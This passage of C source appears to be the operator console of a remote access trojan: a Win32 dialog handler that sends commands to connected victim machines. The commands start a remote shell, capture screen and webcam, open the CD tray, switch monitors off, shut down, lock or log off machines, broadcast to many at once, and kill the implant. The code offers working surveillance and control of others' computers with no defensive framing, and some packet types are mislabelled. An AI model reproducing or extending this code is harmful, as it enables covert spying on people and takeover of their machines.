			item.cchTextMax=255;
			ListView_GetItem(GetDlgItem(Dlg,IDC_SERVERLIST),&item);
			Head.ID = atoi (Head.Data);
			
			item.iSubItem=3;
			item.pszText=IPBUFFER;
			item.cchTextMax=255;
			ListView_GetItem(GetDlgItem(Dlg,IDC_SERVERLIST),&item);
			while(IPBUFFER[i] != '/')
			{
			FINALIPBUFFER[i] = IPBUFFER[i];
			i++;
			}
			Head.PacketType = PACKET_REMOTE_SHELL_START;
			sprintf(Head.Data, "telnet %s", FINALIPBUFFER);
			SentKb+=send(Client[Head.ID],(char*)&Head,HeadSize,0);
			break;

	case IDC_SCREENCAPTURE:
			
		    item.iItem=ListView_GetNextItem(GetDlgItem(Dlg,IDC_SERVERLIST),-1,LVNI_SELECTED);
			item.mask=LVIF_TEXT;
			item.iSubItem=0;
			item.pszText=Head.Data;
			item.cchTextMax=255;
			ListView_GetItem(GetDlgItem(Dlg,IDC_SERVERLIST),&item);
			Head.ID = atoi(Head.Data);
			strcpy(Window.ID, Head.Data);
			GID = atoi(Head.Data);
          if(Screen[atoi(Head.Data)] == NULL)
		  {
			item.iSubItem=3;
			item.pszText=Window.IP;
			item.cchTextMax=255;
			ListView_GetItem(GetDlgItem(Dlg,IDC_SERVERLIST),&item);
			strcpy(WINDOWIP, Window.IP);
			
			strcpy(Buffer, ""); 
			sprintf(Buffer, "Screen Capture for: %s - ID: %d", Window.IP, GID);
			GetTime();
			SetLogs(Time, "Screen Capture", Buffer , "Pass");

			CreateThread(NULL, 0,ScreenWindow,(LPVOID)&Window, 0, &thread);
		  }
		  else
		  {		
	
		  }
			break;
   	case IDC_WEBCAM:
			
		    item.iItem=ListView_GetNextItem(GetDlgItem(Dlg,IDC_SERVERLIST),-1,LVNI_SELECTED);
			item.mask=LVIF_TEXT;
			item.iSubItem=0;
			item.pszText=Head.Data;
			item.cchTextMax=255;
			ListView_GetItem(GetDlgItem(Dlg,IDC_SERVERLIST),&item);
			Head.ID = atoi(Head.Data);
			strcpy(Window.ID, Head.Data);
			GID = atoi(Head.Data);
          if(WebCam[atoi(Head.Data)] == NULL)
		  {
			item.iSubItem=3;
			item.pszText=Window.IP;
			item.cchTextMax=255;
			ListView_GetItem(GetDlgItem(Dlg,IDC_SERVERLIST),&item);
			strcpy(WINDOWIP, Window.IP);
			
			strcpy(Buffer, ""); 
			sprintf(Buffer, "WebCam Capture for: %s - ID: %d", Window.IP, GID);
			GetTime();
			SetLogs(Time, "WebCam Capture", Buffer , "Pass");

			CreateThread(NULL, 0,CamWindow,(LPVOID)&Window, 0, &thread);
		  }
		  else
		  {		
	
		  }
			break;
	case IDC_OPEN_CD:
	
		    item.iItem=ListView_GetNextItem(GetDlgItem(Dlg,IDC_SERVERLIST),-1,LVNI_SELECTED);
			item.mask=LVIF_TEXT;
			item.iSubItem=0;
			item.pszText=Head.Data;
			item.cchTextMax=255;
			ListView_GetItem(GetDlgItem(Dlg,IDC_SERVERLIST),&item);
			Head.ID = atoi(Head.Data);
			Head.PacketType = FUN_OPEN_CD;

			SentKb+=send(Client[Head.ID], (char*)&Head, sizeof(PACKETHEAD), 0);
		break;
	case IDC_CLOSE_CD:	   
		    item.iItem=ListView_GetNextItem(GetDlgItem(Dlg,IDC_SERVERLIST),-1,LVNI_SELECTED);
			item.mask=LVIF_TEXT;
			item.iSubItem=0;
			item.pszText=Head.Data;
			item.cchTextMax=255;
			ListView_GetItem(GetDlgItem(Dlg,IDC_SERVERLIST),&item);
			Head.ID = atoi(Head.Data);
			Head.PacketType = FUN_CLOSE_CD;

			SentKb+=send(Client[Head.ID], (char*)&Head, sizeof(PACKETHEAD), 0);
		break;
	case IDC_MONITOR_OFF:	   
		    item.iItem=ListView_GetNextItem(GetDlgItem(Dlg,IDC_SERVERLIST),-1,LVNI_SELECTED);
			item.mask=LVIF_TEXT;
			item.iSubItem=0;
			item.pszText=Head.Data;
			item.cchTextMax=255;
			ListView_GetItem(GetDlgItem(Dlg,IDC_SERVERLIST),&item);
			Head.ID = atoi(Head.Data);
			Head.PacketType = FUN_MONITOR_OFF;

			SentKb+=send(Client[Head.ID], (char*)&Head, sizeof(PACKETHEAD), 0);

		break;
	case IDC_MONITOR_ON:	   
		    item.iItem=ListView_GetNextItem(GetDlgItem(Dlg,IDC_SERVERLIST),-1,LVNI_SELECTED);
			item.mask=LVIF_TEXT;
			item.iSubItem=0;
			item.pszText=Head.Data;
			item.cchTextMax=255;
			ListView_GetItem(GetDlgItem(Dlg,IDC_SERVERLIST),&item);
			Head.ID = atoi(Head.Data);
			Head.PacketType = FUN_MONITOR_ON;

			SentKb+=send(Client[Head.ID], (char*)&Head, sizeof(PACKETHEAD), 0);
		break;
	case IDC_INVERT_SCREEN_COLOUR:	   
		    item.iItem=ListView_GetNextItem(GetDlgItem(Dlg,IDC_SERVERLIST),-1,LVNI_SELECTED);
			item.mask=LVIF_TEXT;
			item.iSubItem=0;
			item.pszText=Head.Data;
			item.cchTextMax=255;
			ListView_GetItem(GetDlgItem(Dlg,IDC_SERVERLIST),&item);
			Head.ID = atoi(Head.Data);
			Head.PacketType = FUN_INVERT_SCREEN_COLOUR;

			SentKb+=send(Client[atoi(Head.Data)], (char*)&Head, sizeof(PACKETHEAD), 0);
		break;
	case IDC_SHUTDOWN:
		  item.iItem=ListView_GetNextItem(GetDlgItem(Dlg,IDC_SERVERLIST),-1,LVNI_SELECTED);
			item.mask=LVIF_TEXT;
			item.iSubItem=0;
			item.pszText=Head.Data;
			item.cchTextMax=255;
			ListView_GetItem(GetDlgItem(Dlg,IDC_SERVERLIST),&item);

			Head.ID = atoi(Head.Data);
			Head.PacketType = PACKET_COMPUTER_SHUTDOWN;
			SentKb+=send(Client[Head.ID],(char*)&Head,HeadSize,0);

			item.iSubItem=3;
			item.pszText=Window.IP;
			item.cchTextMax=255;
			ListView_GetItem(GetDlgItem(Dlg,IDC_SERVERLIST),&item);
			strcpy(WINDOWIP, Window.IP);		
			
			strcpy(Buffer, ""); 
			sprintf(Buffer, "ShutDown: %s", Window.IP);
			GetTime();
			SetLogs(Time, "ShutDown", Buffer , "Pass");

		break;

	case IDC_LOCK:
		  item.iItem=ListView_GetNextItem(GetDlgItem(Dlg,IDC_SERVERLIST),-1,LVNI_SELECTED);
			item.mask=LVIF_TEXT;
			item.iSubItem=0;
			item.pszText=Head.Data;
			item.cchTextMax=255;
			ListView_GetItem(GetDlgItem(Dlg,IDC_SERVERLIST),&item);

			Head.ID = atoi(Head.Data);
			Head.PacketType = PACKET_COMPUTER_LOGOFF;
			SentKb+=send(Client[Head.ID],(char*)&Head,HeadSize,0);

			item.iSubItem=3;
			item.pszText=Window.IP;
			item.cchTextMax=255;
			ListView_GetItem(GetDlgItem(Dlg,IDC_SERVERLIST),&item);
			strcpy(WINDOWIP, Window.IP);
			
			strcpy(Buffer, ""); 
			sprintf(Buffer, "Locked: %s", Window.IP);
			GetTime();
			SetLogs(Time, "Locked", Buffer , "Pass");
		break;

	case IDC_LOGOFF:
		  item.iItem=ListView_GetNextItem(GetDlgItem(Dlg,IDC_SERVERLIST),-1,LVNI_SELECTED);
			item.mask=LVIF_TEXT;
			item.iSubItem=0;
			item.pszText=Head.Data;
			item.cchTextMax=255;
			ListView_GetItem(GetDlgItem(Dlg,IDC_SERVERLIST),&item);
			
			Head.ID = atoi(Head.Data);	
			Head.PacketType = PACKET_COMPUTER_LOCK;
			SentKb+=send(Client[Head.ID],(char*)&Head,HeadSize,0);

			item.iSubItem=3;
			item.pszText=Window.IP;
			item.cchTextMax=255;
			ListView_GetItem(GetDlgItem(Dlg,IDC_SERVERLIST),&item);
			strcpy(WINDOWIP, Window.IP);
			
			strcpy(Buffer, ""); 
			sprintf(Buffer, "Logged Off: %s", Window.IP);
			GetTime();
			SetLogs(Time, "Logged Off", Buffer , "Pass");
		break;

	case IDC_BROADCAST_SHUTDOWN:
		while (i <= ListView_GetItemCount(GetDlgItem(Dlg,IDC_SERVERLIST)))
		{
		if(ListView_GetCheckState(GetDlgItem(Dlg,IDC_SERVERLIST),i))
		{
		item.iItem=i;
			item.mask=LVIF_TEXT;
			item.iSubItem=0;
			item.pszText=Head.Data;
			item.cchTextMax=255;
			ListView_GetItem(GetDlgItem(HwND,IDC_SERVERLIST),&item);

			Head.ID = atoi(Head.Data);
			Head.PacketType = PACKET_COMPUTER_SHUTDOWN;
			SentKb+=send(Client[Head.ID],(char*)&Head,HeadSize,0);


			item.iSubItem=3;
			item.pszText=Window.IP;
			item.cchTextMax=255;
			ListView_GetItem(GetDlgItem(Dlg,IDC_SERVERLIST),&item);
			strcpy(WINDOWIP, Window.IP);
			
			strcpy(Buffer, ""); 
			sprintf(Buffer, "ShutDown: %s", Window.IP);
			GetTime();
			SetLogs(Time, "ShutDown", Buffer , "Pass");
		}
		i++;
		}
		break;

	case IDC_BROADCAST_LOGOFF:
		i = 0;
		if(ListView_GetCheckState(GetDlgItem(Dlg,IDC_SERVERLIST),0))
		{
		//MessageBox(NULL, Head.Data, "Head.Data", MB_OK);
			item.iItem=i;
			item.mask=LVIF_TEXT;
			item.iSubItem=0;
			item.pszText=Head.Data;
			item.cchTextMax=255;
			ListView_GetItem(GetDlgItem(HwND,IDC_SERVERLIST),&item);

			Head.ID = atoi(Head.Data);
			Head.PacketType = PACKET_COMPUTER_LOCK;
			SentKb+=send(Client[Head.ID],(char*)&Head,HeadSize,0);


			item.iSubItem=3;
			item.pszText=Window.IP;
			item.cchTextMax=255;
			ListView_GetItem(GetDlgItem(Dlg,IDC_SERVERLIST),&item);
			strcpy(WINDOWIP, Window.IP);
			
			strcpy(Buffer, ""); 
			sprintf(Buffer, "Logged Off: %s", Window.IP);
			GetTime();
			SetLogs(Time, "Log off", Buffer , "Pass");
		}

		while (i < ListView_GetItemCount(GetDlgItem(Dlg,IDC_SERVERLIST)))
		{
		if(ListView_GetCheckState(GetDlgItem(Dlg,IDC_SERVERLIST),i))
		{
			//MessageBox(NULL, Head.Data, "Head.Data", MB_OK);
			item.iItem=i;
			item.mask=LVIF_TEXT;
			item.iSubItem=0;
			item.pszText=Head.Data;
			item.cchTextMax=255;
			ListView_GetItem(GetDlgItem(HwND,IDC_SERVERLIST),&item);

			Head.ID = atoi(Head.Data);
			Head.PacketType = PACKET_COMPUTER_LOCK;
			SentKb+=send(Client[Head.ID],(char*)&Head,HeadSize,0);


			item.iSubItem=3;
			item.pszText=Window.IP;
			item.cchTextMax=255;
			ListView_GetItem(GetDlgItem(Dlg,IDC_SERVERLIST),&item);
			strcpy(WINDOWIP, Window.IP);
			
			strcpy(Buffer, ""); 
			sprintf(Buffer, "Logged Off: %s", Window.IP);
			GetTime();
			SetLogs(Time, "Log off", Buffer , "Pass");
		}
		i++;
		}
		break;

	case IDC_BROADCAST_LOCK:
		while (i <= ListView_GetItemCount(GetDlgItem(Dlg,IDC_SERVERLIST)))
		{
		if(ListView_GetCheckState(GetDlgItem(Dlg,IDC_SERVERLIST),i))
		{
			item.iItem=i;
			item.mask=LVIF_TEXT;
			item.iSubItem=0;
			item.pszText=Head.Data;
			item.cchTextMax=255;
			ListView_GetItem(GetDlgItem(HwND,IDC_SERVERLIST),&item);

			Head.ID = atoi(Head.Data);
			Head.PacketType = PACKET_COMPUTER_LOGOFF;
			SentKb+=send(Client[Head.ID],(char*)&Head,HeadSize,0);


			item.iSubItem=3;
			item.pszText=Window.IP;
			item.cchTextMax=255;
			ListView_GetItem(GetDlgItem(Dlg,IDC_SERVERLIST),&item);
			strcpy(WINDOWIP, Window.IP);
			
			strcpy(Buffer, ""); 
			sprintf(Buffer, "Locked: %s", Window.IP);
			GetTime();
			SetLogs(Time, "Lock", Buffer , "Pass");
		}
		i++;
		}
		break;

    case IDC_BROADCAST_KILL:
		while (i <= ListView_GetItemCount(GetDlgItem(Dlg,IDC_SERVERLIST)))
		{

		if(ListView_GetCheckState(GetDlgItem(Dlg,IDC_SERVERLIST),i))
		{
			item.iItem=i;
			item.mask=LVIF_TEXT;
			item.iSubItem=0;
			item.pszText=Head.Data;
			item.cchTextMax=255;
			ListView_GetItem(GetDlgItem(HwND,IDC_SERVERLIST),&item);
			Head.ID = atoi(Head.Data);
		 	Head.ID = atoi (Head.Data);
			Head.PacketType = PACKET_EXIT;
			SentKb+=send(Client[Head.ID],(char*)&Head,HeadSize,0);

			Sleep(1000);

			item.iSubItem=3;
			item.pszText=Window.IP;
			item.cchTextMax=255;
			ListView_GetItem(GetDlgItem(Dlg,IDC_SERVERLIST),&item);
			strcpy(WINDOWIP, Window.IP);
			
			strcpy(Buffer, ""); 
			sprintf(Buffer, "Killed: %s", Window.IP);
			GetTime();
			SetLogs(Time, "Kill", Buffer , "Pass");
		}

		i++;
		}
		break;
	case IDC_HELPA:
					ShellExecute(NULL, "open", "FAQ.txt", NULL, NULL, SW_SHOWNORMAL);
		break;
	case IDCANCEL:
            
            if(MessageBox(NULL, "Are you sure you want to Close?", "Closing...", MB_YESNO | MB_ICONQUESTION) == IDYES)
				{
			    WSACleanup();
				ExitProcess(0);
			    EndDialog(Dlg,Select);
		    	PostQuitMessage(0);
		    	break;
				}
				
				else
				{
				MessageBox(NULL, "WHY DID YOU CLICK THE X IF YOU DID NOT WANT TO EXIT?!", "Retard.", MB_OK | MB_ICONWARNING);	
				break;
				}
			break;
		}
//////////////////////////////////////////////////////////////////////////////// 
	default:
		return FALSE;
	}
return TRUE;
}

